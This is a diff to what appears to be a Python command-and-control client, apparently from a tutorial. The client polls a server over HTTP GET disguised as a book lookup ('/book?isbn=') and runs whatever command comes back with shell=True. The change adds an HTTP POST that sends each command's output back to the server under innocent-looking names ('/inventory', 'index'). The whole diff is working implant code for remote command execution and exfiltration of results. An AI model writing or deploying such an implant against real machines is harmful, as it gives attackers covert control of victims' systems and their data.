@@ -3,7 +3,7 @@
 from os import getenv
 from subprocess import run, PIPE, STDOUT
 from time import sleep, time
-from requests import exceptions, get
+from requests import exceptions, get, post
 from sys import platform
 from os import uname
 
@@ -26,6 +26,12 @@ C2_SERVER = "localhost"
 
 # Path to use for signifying a command request form a client using HTTP GET
 CMD_REQUEST = "/book?isbn="
+
+# Path to use for signifying a command output from client using HTTP POST
+CMD_RESPONSE = "/inventory"
+
+# POST variable name to use for assigning to command output from a client
+CMD_RESPONSE_KEY = "index"
 
 # Define a sleep delay time in seconds for re-connection attempts
 DELAY = 3
@@ -52,7 +58,9 @@ while True:
     command = response.content.decode()
 
     # Run our operating system command via the subprocess module's run function
-    command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT)
-    print(command_output.stdout.decode())
+    command_output = run(command, shell=True, stdout=PIPE, stderr=STDOUT).stdout
+
+    # Send the command output to the c2 server
+    post(url=f"http://{C2_SERVER}:{PORT}{CMD_RESPONSE}", data={CMD_RESPONSE_KEY: command_output}, headers=HEADER, proxies=PROXY)
 
     print(response.status_code)
